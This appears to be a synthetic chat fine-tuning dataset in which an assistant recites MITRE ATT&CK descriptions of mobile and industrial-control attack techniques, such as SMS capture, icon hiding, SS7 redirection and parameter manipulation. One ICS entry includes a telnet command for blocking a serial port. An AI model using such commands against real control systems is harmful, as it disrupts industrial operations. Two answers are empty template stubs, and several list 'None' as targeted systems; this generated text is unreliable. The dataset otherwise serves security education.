{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Geofencing' and with the Id: T1627.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Geofencing' and with the Id: T1627.001 is described as follows: Adversaries may use a device\u2019s geographical location to limit certain malicious behaviors. For example, malware operators may limit the distribution of a second stage payload to certain geographic regions.(Citation: Lookout eSurv)[Geofencing](https://attack.mitre.org/techniques/T1627/001)\u202fis accomplished by persuading the user to grant the application permission to access location services. The application can then collect, process, and exfiltrate the device\u2019s location to perform location-based actions, such as ceasing malicious behavior or showing region-specific advertisements. One method to accomplish\u202f[Geofencing](https://attack.mitre.org/techniques/T1627/001)\u202fon Android is to use the built-in Geofencing API to automatically trigger certain behaviors when the device enters or exits a specified radius around a geographical location. Similar to  other\u202f[Geofencing](https://attack.mitre.org/techniques/T1627/001) methods, this requires that the user has granted the `ACCESS_FINE_LOCATION` and `ACCESS_BACKGROUND_LOCATION` permissions. The latter is only required if the application targets Android 10 (API level 29) or higher. However, Android 11 introduced additional permission controls that may restrict background location collection based on user permission choices at runtime. These additional controls include \"Allow only while using the app\", which will effectively prohibit background location collection.  Similarly, on iOS, developers can use built-in APIs to setup and execute geofencing. Depending on the use case, the app will either need to call\u202f`requestWhenInUseAuthorization()`\u202for\u202f`requestAlwaysAuthorization()`, depending on when access to the location services is required. Similar to Android, users also have the option to limit when the application can access the device\u2019s location, including one-time use and only when the application is running in the foreground.  [Geofencing](https://attack.mitre.org/techniques/T1627/001)\u202fcan be used to prevent exposure of capabilities in environments that are not intended to be compromised or operated within. For example, location data could be used to limit malware spread and/or capabilities, which could also potentially evade application analysis environments (ex: malware analysis outside of the target geographic area). Other malicious usages could include showing language-specific input prompts and/or advertisements.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Network Information Discovery' and with the Id: T1507 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Network Information Discovery' and with the Id: T1507 is described as follows: Adversaries may use device sensors to collect information about nearby networks, such as Wi-Fi and Bluetooth.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Capture SMS Messages' and with the Id: T1412 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Capture SMS Messages' and with the Id: T1412 is described as follows: A malicious application could capture sensitive data sent via SMS, including authentication credentials. SMS is frequently used to transmit codes used for multi-factor authentication.On Android, a malicious application must request and obtain permission (either at app install time or run time) in order to receive SMS messages. Alternatively, a malicious application could attempt to perform an operating system privilege escalation attack to bypass the permission requirement.On iOS, applications cannot access SMS messages in normal operation, so an adversary would need to attempt to perform an operating system privilege escalation attack to potentially be able to access SMS messages.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Conceal Multimedia Files' and with the Id: T1628.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Conceal Multimedia Files' and with the Id: T1628.003 is described as follows: Adversaries may attempt to hide multimedia files from the user. By doing so, adversaries may conceal captured files, such as pictures, videos and/or screenshots, then later exfiltrate those files.  Specific to Android devices, if the `.nomedia` file is present in a folder, multimedia files in that folder will not be visible to the user in the Gallery application. Additionally, other applications are asked not to scan the folder with the `.nomedia` file, effectively making the folder appear invisible to the user.  This technique is often used by stalkerware and spyware applications.  . The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Endpoint Denial of Service' and with the Id: T1642 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Endpoint Denial of Service' and with the Id: T1642 is described as follows: Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users.On Android versions prior to 7, apps can abuse Device Administrator access to reset the device lock passcode, preventing the user from unlocking the device. After Android 7, only device or profile owners (e.g. MDMs) can reset the device\u2019s passcode.(Citation: Android resetPassword)On iOS devices, this technique does not work because mobile device management servers can only remove the screen lock passcode; they cannot set a new passcode. However, on jailbroken devices, malware has been discovered that can lock the user out of the device.(Citation: Xiao-KeyRaider). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Out of Band Data' and with the Id: T1644 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Out of Band Data' and with the Id: T1644 is described as follows: Adversaries may communicate with compromised devices using out of band data streams. This could be done for a variety of reasons, including evading network traffic monitoring, as a backup method of command and control, or for data exfiltration if the device is not connected to any Internet-providing networks (i.e. cellular or Wi-Fi). Several out of band data streams exist, such as SMS messages, NFC, and Bluetooth.  On Android, applications can read push notifications to capture content from SMS messages, or other out of band data streams. This requires that the user manually grant notification access to the application via the settings menu. However, the application could launch an Intent to take the user directly there.  On iOS, there is no way to programmatically read push notifications. . The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Encrypted Channel' and with the Id: T1521 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Encrypted Channel' and with the Id: T1521 is described as follows: Adversaries may explicitly employ a known encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to reverse engineering if necessary secret keys are encoded and/or generated within malware samples/configuration files.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploit TEE Vulnerability' and with the Id: T1405 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploit TEE Vulnerability' and with the Id: T1405 is described as follows: A malicious app or other attack vector could be used to exploit vulnerabilities in code running within the Trusted Execution Environment (TEE) (Citation: Thomas-TrustZone). The adversary could then obtain privileges held by the TEE potentially including the ability to access cryptographic keys or other sensitive data (Citation: QualcommKeyMaster). Escalated operating system privileges may be first required in order to have the ability to attack the TEE (Citation: EkbergTEE). If not, privileges within the TEE can potentially be used to exploit the operating system (Citation: laginimaineb-TEE).. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Suppress Application Icon' and with the Id: T1628.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Suppress Application Icon' and with the Id: T1628.001 is described as follows: A malicious application could suppress its icon from being displayed to the user in the application launcher. This hides the fact that it is installed, and can make it more difficult for the user to uninstall the application. Hiding the application's icon programmatically does not require any special permissions. This behavior has been seen in the BankBot/Spy Banker family of malware.(Citation: android-trojan-steals-paypal-2fa)(Citation: sunny-stolen-credentials)(Citation: bankbot-spybanker) Beginning in Android 10, changes were introduced to inhibit malicious applications\u2019 ability to hide their icon. If an app is a system app, requests no permissions, or does not have a launcher activity, the application\u2019s icon will be fully hidden. Further, if the device is fully managed or the application is in a work profile, the icon will be fully hidden. Otherwise, a synthesized activity is shown, which is a launcher icon that represents the app\u2019s details page in the system settings. If the user clicks the synthesized activity in the launcher, they are taken to the application\u2019s details page in the system settings.(Citation: Android 10 Limitations to Hiding App Icons)(Citation: LauncherApps getActivityList). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Trusted Execution Environment' and with the Id: T1399 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Trusted Execution Environment' and with the Id: T1399 is described as follows: If an adversary can escalate privileges, he or she may be able to use those privileges to place malicious code in the device's Trusted Execution Environment (TEE) or other similar isolated execution environment where the code can evade detection, may persist after device resets, and may not be removable by the device user. Running code within the TEE may provide an adversary with the ability to monitor or tamper with overall device behavior.(Citation: Roth-Rootkits). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Device Unlock Code Guessing or Brute Force' and with the Id: T1459 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Device Unlock Code Guessing or Brute Force' and with the Id: T1459 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Downgrade to Insecure Protocols' and with the Id: T1466 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Downgrade to Insecure Protocols' and with the Id: T1466 is described as follows: An adversary could cause the mobile device to use less secure protocols, for example by jamming frequencies used by newer protocols such as LTE and only allowing older protocols such as GSM to communicate(Citation: NIST-SP800187). Use of less secure protocols may make communication easier to eavesdrop upon or manipulate.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Masquerading' and with the Id: T1655 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Masquerading' and with the Id: T1655 is described as follows: Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools. Masquerading occurs when the name, location, or appearance of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation. This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names.Renaming abusable system utilities to evade security monitoring is also a form of [Masquerading](https://attack.mitre.org/techniques/T1655). The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Generate Fraudulent Advertising Revenue' and with the Id: T1472 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Generate Fraudulent Advertising Revenue' and with the Id: T1472 is described as follows: An adversary could seek to generate fraudulent advertising revenue from mobile devices, for example by triggering automatic clicks of advertising links without user involvement.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Malicious or Vulnerable Built-in Device Functionality' and with the Id: T1473 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Malicious or Vulnerable Built-in Device Functionality' and with the Id: T1473 is described as follows: . The systems targeted by this attack pattern are:  ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Steganography' and with the Id: T1406.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Steganography' and with the Id: T1406.001 is described as follows: Adversaries may use steganography techniques in order to prevent the detection of hidden information. Steganographic techniques can be used to hide data in digital media such as images, audio tracks, video clips, or text files.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exploit SS7 to Redirect Phone Calls/SMS' and with the Id: T1449 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exploit SS7 to Redirect Phone Calls/SMS' and with the Id: T1449 is described as follows: An adversary could exploit signaling system vulnerabilities to redirect calls or text messages (SMS) to a phone number under the attacker's control. The adversary could then act as an adversary-in-the-middle to intercept or manipulate the communication. (Citation: Engel-SS7) (Citation: Engel-SS7-2008) (Citation: 3GPP-Security) (Citation: Positive-SS7) (Citation: CSRIC5-WG10-FinalReport) Interception of SMS messages could enable adversaries to obtain authentication codes used for multi-factor authentication(Citation: TheRegister-SS7).. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Hide Artifacts' and with the Id: T1628 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Hide Artifacts' and with the Id: T1628 is described as follows: Adversaries may attempt to hide artifacts associated with their behaviors to evade detection. Mobile operating systems have features and developer APIs to hide various artifacts, such as an application\u2019s launcher icon. These APIs have legitimate usages, such as hiding an icon to avoid application drawer clutter when an application does not have a usable interface. Adversaries may abuse these features and APIs to hide artifacts from the user to evade detection.. The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Code Signing Policy Modification' and with the Id: T1632.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Code Signing Policy Modification' and with the Id: T1632.001 is described as follows: Adversaries may modify code signing policies to enable execution of applications signed with unofficial or unknown keys. Code signing provides a level of authenticity on an app from a developer, guaranteeing that the program has not been tampered with and comes from an official source. Security controls can include enforcement mechanisms to ensure that only valid, signed code can be run on a device. Mobile devices generally enable these security controls by default, such as preventing the installation of unknown applications on Android. Adversaries may modify these policies in a number of ways, including [Input Injection](https://attack.mitre.org/techniques/T1516) or malicious configuration profiles.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Domain Generation Algorithms' and with the Id: T1637.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Domain Generation Algorithms' and with the Id: T1637.001 is described as follows: Adversaries may use [Domain Generation Algorithms](https://attack.mitre.org/techniques/T1637/001) (DGAs) to procedurally generate domain names for uses such as command and control communication   or malicious application distribution.(Citation: securelist rotexy 2018)DGAs increase the difficulty for defenders to block, track, or take over the command and control channel, as there could potentially be thousands of domains that malware can check for instructions.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Drive-By Compromise' and with the Id: T1456 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Drive-By Compromise' and with the Id: T1456 is described as follows: Adversaries may gain access to a system through a user visiting a website over the normal course of browsing. With this technique, the user's web browser is typically targeted for exploitation, but adversaries may also use compromised websites for non-exploitation behavior such as acquiring an [Application Access Token](https://attack.mitre.org/techniques/T1550/001).Multiple ways of delivering exploit code to a browser exist, including:* A legitimate website is compromised where adversaries have injected some form of malicious code such as JavaScript, iFrames, and cross-site scripting.* Malicious ads are paid for and served through legitimate ad providers.* Built-in web application interfaces are leveraged for the insertion of any other kind of object that can be used to display web content or contain a script that executes on the visiting client (e.g. forum posts, comments, and other user controllable web content).Often the website used by an adversary is one visited by a specific community, such as government, a particular industry, or region, where the goal is to compromise a specific user or set of users based on a shared interest. This kind of targeted attack is referred to a strategic web compromise or watering hole attack. There are several known examples of this occurring.(Citation: Lookout-StealthMango)Typical drive-by compromise process:1. A user visits a website that is used to host the adversary controlled content.2. Scripts automatically execute, typically searching versions of the browser and plugins for a potentially vulnerable version.     * The user may be required to assist in this process by enabling scripting or active website components and ignoring warning dialog boxes.3. Upon finding a vulnerable version, exploit code is delivered to the browser.4. If exploitation is successful, then it will give the adversary code execution on the user's system unless other protections are in place.    * In some cases a second visit to the website after the initial scan is required before exploit code is delivered.. The systems targeted by this attack pattern are: Android, iOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Suppress Application Icon' and with the Id: T1508 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Suppress Application Icon' and with the Id: T1508 is described as follows: A malicious application could suppress its icon from being displayed to the user in the application launcher to hide the fact that it is installed, and to make it more difficult for the user to uninstall the application. Hiding the application's icon programmatically does not require any special permissions.This behavior has been seen in the BankBot/Spy Banker family of malware.(Citation: android-trojan-steals-paypal-2fa)(Citation: sunny-stolen-credentials)(Citation: bankbot-spybanker). The systems targeted by this attack pattern are: Android ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Block Command Message' and with the Id: T0803 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Block Command Message' and with the Id: T0803 is described as follows: Adversaries may block a command message from reaching its intended target to prevent command execution. In OT networks, command messages are sent to provide instructions to control system devices. A blocked command message can inhibit response functions from correcting a disruption or unsafe condition. (Citation: Bonnie Zhu, Anthony Joseph, Shankar Sastry 2011)  (Citation: Electricity Information Sharing and Analysis Center; SANS Industrial Control Systems March 2016). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Service Stop' and with the Id: T0881 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Service Stop' and with the Id: T0881 is described as follows: Adversaries may stop or disable services on a system to render those services unavailable to legitimate users. Stopping critical services can inhibit or stop response to an incident or aid in the adversary's overall objectives to cause damage to the environment. (Citation: Enterprise ATT&CK)  Services may not allow for modification of their data stores while running. Adversaries may stop services in order to conduct Data Destruction. (Citation: Enterprise ATT&CK). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Parameter' and with the Id: T0836 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Parameter' and with the Id: T0836 is described as follows: Adversaries may modify parameters used to instruct industrial control system devices. These devices operate via programs that dictate how and when to perform actions based on such parameters. Such parameters can determine the extent to which an action is performed and may specify additional options. For example, a program on a control system device dictating motor processes may take a parameter defining the total number of seconds to run that motor.      An adversary can potentially modify these parameters to produce an outcome outside of what was intended by the operators. By modifying system and process critical parameters, the adversary may cause [Impact](https://attack.mitre.org/tactics/TA0105) to equipment and/or control processes. Modified parameters may be turned into dangerous, out-of-bounds, or unexpected values from typical operations. For example, specifying that a process run for more or less time than it should, or dictating an unusually high, low, or invalid value as a parameter.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Controller Tasking' and with the Id: T0821 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Controller Tasking' and with the Id: T0821 is described as follows: Adversaries may modify the tasking of a controller to allow for the execution of their own programs. This can allow an adversary to manipulate the execution flow and behavior of a controller. According to 61131-3, the association of a Task with a Program Organization Unit (POU) defines a task association. (Citation: IEC February 2013) An adversary may modify these associations or create new ones to manipulate the execution flow of a controller. Modification of controller tasking can be accomplished using a Program Download in addition to other types of program modification such as online edit and program append.Tasks have properties, such as interval, frequency and priority to meet the requirements of program execution. Some controller vendors implement tasks with implicit, pre-defined properties whereas others allow for these properties to be formulated explicitly. An adversary may associate their program with tasks that have a higher priority or execute associated programs more frequently. For instance, to ensure cyclic execution of their program on a Siemens controller, an adversary may add their program to the task, Organization Block 1 (OB1).. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Wireless Sniffing' and with the Id: T0887 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Wireless Sniffing' and with the Id: T0887 is described as follows: Adversaries may seek to capture radio frequency (RF) communication used for remote control and reporting in distributed environments. RF communication frequencies vary between 3 kHz to 300 GHz, although are commonly between 300 MHz to 6 GHz. (Citation: Candell, R., Hany, M., Lee, K. B., Liu,Y., Quimby, J., Remley, K. April 2018)  The wavelength and frequency of the signal affect how the signal propagates through open air, obstacles (e.g. walls and trees) and the type of radio required to capture them. These characteristics are often standardized in the protocol and hardware and may have an effect on how the signal is captured. Some examples of wireless protocols that may be found in cyber-physical environments are: WirelessHART, Zigbee, WIA-FA, and 700 MHz Public Safety Spectrum. Adversaries may capture RF communications by using specialized hardware, such as software defined radio (SDR), handheld radio, or a computer with radio demodulator tuned to the communication frequency. (Citation: Bastille April 2017) Information transmitted over a wireless medium may be captured in-transit whether the sniffing device is the intended destination or not. This technique may be particularly useful to an adversary when the communications are not encrypted. (Citation: Gallagher, S. April 2017) In the 2017 Dallas Siren incident, it is suspected that adversaries likely captured wireless command message broadcasts on a 700 MHz frequency during a regular test of the system. These messages were later replayed to trigger the alarm systems. (Citation: Gallagher, S. April 2017). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Loss of View' and with the Id: T0829 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Loss of View' and with the Id: T0829 is described as follows: Adversaries may cause a sustained or permanent loss of view where the ICS equipment will require local, hands-on operator intervention; for instance, a restart or manual operation. By causing a sustained reporting or visibility loss, the adversary can effectively hide the present state of operations. This loss of view can occur without affecting the physical processes themselves. (Citation: Corero) (Citation: Michael J. Assante and Robert M. Lee) (Citation: Tyson Macaulay). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Activate Firmware Update Mode' and with the Id: T0800 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Activate Firmware Update Mode' and with the Id: T0800 is described as follows: Adversaries may activate firmware update mode on devices to prevent expected response functions from engaging in reaction to an emergency or process malfunction. For example, devices such as protection relays may have an operation mode designed for firmware installation. This mode may halt process monitoring and related functions to allow new firmware to be loaded. A device left in update mode may be placed in an inactive holding state if no firmware is provided to it. By entering and leaving a device in this mode, the adversary may deny its usual functionalities.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Manipulation of Control' and with the Id: T0831 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Manipulation of Control' and with the Id: T0831 is described as follows: Adversaries may manipulate physical process control within the industrial environment. Methods of manipulating control can include changes to set point values, tags, or other parameters. Adversaries may manipulate control systems devices or possibly leverage their own, to communicate with and command physical control processes. The duration of manipulation may be temporary or longer sustained, depending on operator detection.   Methods of Manipulation of Control include: * Man-in-the-middle  * Spoof command message * Changing setpoints  A Polish student used a remote controller device to interface with the Lodz city tram system in Poland. (Citation: John Bill May 2017) (Citation: Shelley Smith February 2008) (Citation: Bruce Schneier January 2008) Using this remote, the student was able to capture and replay legitimate tram signals. As a consequence, four trams were derailed and twelve people injured due to resulting emergency stops. (Citation: Shelley Smith February 2008) The track controlling commands issued may have also resulted in tram collisions, a further risk to those on board and nearby the areas of impact. (Citation: Bruce Schneier January 2008). The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Denial of Service' and with the Id: T0814 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Denial of Service' and with the Id: T0814 is described as follows: Adversaries may perform Denial-of-Service (DoS) attacks to disrupt expected device functionality. Examples of DoS attacks include overwhelming the target device with a high volume of requests in a short time period and sending the target device a request it does not know how to handle. Disrupting device state may temporarily render it unresponsive, possibly lasting until a reboot can occur. When placed in this state, devices may be unable to send and receive requests, and may not perform expected response functions in reaction to other events in the environment. Some ICS devices are particularly sensitive to DoS events, and may become unresponsive in reaction to even a simple ping sweep. Adversaries may also attempt to execute a Permanent Denial-of-Service (PDoS) against certain devices, such as in the case of the BrickerBot malware. (Citation: ICS-CERT April 2017) Adversaries may exploit a software vulnerability to cause a denial of service by taking advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Vulnerabilities may exist in software that can be used to cause a denial of service condition. Adversaries may have prior knowledge about industrial protocols or control devices used in the environment through [Remote System Information Discovery](https://attack.mitre.org/techniques/T0888). There are examples of adversaries remotely causing a [Device Restart/Shutdown](https://attack.mitre.org/techniques/T0816) by exploiting a vulnerability that induces uncontrolled resource consumption. (Citation: ICS-CERT August 2018) (Citation: Common Weakness Enumeration January 2019) (Citation: MITRE March 2018) . The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Block Serial COM' and with the Id: T0805 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Block Serial COM' and with the Id: T0805 is described as follows: Adversaries may block access to serial COM to prevent instructions or configurations from reaching target devices. Serial Communication ports (COM) allow communication with control system devices. Devices can receive command and configuration messages over such serial COM. Devices also use serial COM to send command and reporting messages. Blocking device serial COM may also block command messages and block reporting messages. A serial to Ethernet converter is often connected to a serial COM to facilitate communication between serial and Ethernet devices. One approach to blocking a serial COM would be to create and hold open a TCP session with the Ethernet side of the converter. A serial to Ethernet converter may have a few ports open to facilitate multiple communications. For example, if there are three serial COM available -- 1, 2 and 3 --, the converter might be listening on the corresponding ports 20001, 20002, and 20003. If a TCP/IP connection is opened with one of these ports and held open, then the port will be unavailable for use by another party. One way the adversary could achieve this would be to initiate a TCP session with the serial to Ethernet converter at 10.0.0.1 via Telnet on serial port 1 with the following command: telnet 10.0.0.1 20001.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'System Binary Proxy Execution' and with the Id: T0894 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'System Binary Proxy Execution' and with the Id: T0894 is described as follows: Adversaries may bypass process and/or signature-based defenses by proxying execution of malicious content with signed, or otherwise trusted, binaries. Binaries used in this technique are often Microsoft-signed files, indicating that they have been either downloaded from Microsoft or are already native in the operating system. (Citation: LOLBAS Project) Binaries signed with trusted digital certificates can typically execute on Windows systems protected by digital signature validation. Several Microsoft signed binaries that are default on Windows installations can be used to proxy execution of other files or commands. Similarly, on Linux systems adversaries may abuse trusted binaries such as split to proxy execution of malicious commands. (Citation: split man page)(Citation: GTFO split)Adversaries may abuse application binaries installed on a system for proxy execution of malicious code or domain-specific commands. These commands could be used to target local resources on the device or networked devices within the environment through defined APIs ([Execution through API](https://attack.mitre.org/techniques/T0871)) or application-specific programming languages (e.g., MicroSCADA SCIL). Application binaries may be signed by the developer or generally trusted by the operators, analysts, and monitoring tools accustomed to the environment. These applications may be developed and/or directly provided by the device vendor to enable configuration, management, and operation of their devices without many alternatives. Adversaries may seek to target these trusted application binaries to execute or send commands without the development of custom malware. For example, adversaries may target a SCADA server binary which has the existing ability to send commands to substation devices, such as through IEC 104 command messages. Proxy execution may still require the development of custom tools to hook into the application binary\u2019s execution.. The systems targeted by this attack pattern are: None ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Role Identification' and with the Id: T0850 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Role Identification' and with the Id: T0850 is described as follows: Adversaries may perform role identification of devices involved with physical processes of interest in a target control system. Control systems devices often work in concert to control a physical process. Each device can have one or more roles that it performs within that control process. By collecting this role-based data, an adversary can construct a more targeted attack.For example, a power generation plant may have unique devices such as one that monitors power output of a generator and another that controls the speed of a turbine. Examining devices roles allows the adversary to observe how the two devices work together to monitor and control a physical process. Understanding the role of a target device can inform the adversary's decision on what action to take, in order to cause Impact and influence or disrupt the integrity of operations. Furthermore, an adversary may be able to capture control system protocol traffic. By studying this traffic, the adversary may be able to determine which devices are outstations, and which are masters. Understanding of master devices and their role within control processes can enable the use of Rogue Master Device. The systems targeted by this attack pattern are: Windows, Human-Machine Interface, Control Server, Data Historian, Field Controller/RTU/PLC/IED ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Command-Line Interface' and with the Id: T0807 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Command-Line Interface' and with the Id: T0807 is described as follows: Adversaries may utilize command-line interfaces (CLIs) to interact with systems and execute commands. CLIs provide a means of interacting with computer systems and are a common feature across many types of platforms and devices within control systems environments. (Citation: Enterprise ATT&CK January 2018) Adversaries may also use CLIs to install and run new software, including malicious tools that may be installed over the course of an operation.CLIs are typically accessed locally, but can also be exposed via services, such as SSH, Telnet, and RDP.  Commands that are executed in the CLI execute with the current permissions level of the process running the terminal emulator, unless the command specifies a change in permissions context. Many controllers have CLI interfaces for management purposes.. The systems targeted by this attack pattern are: None ."}]}
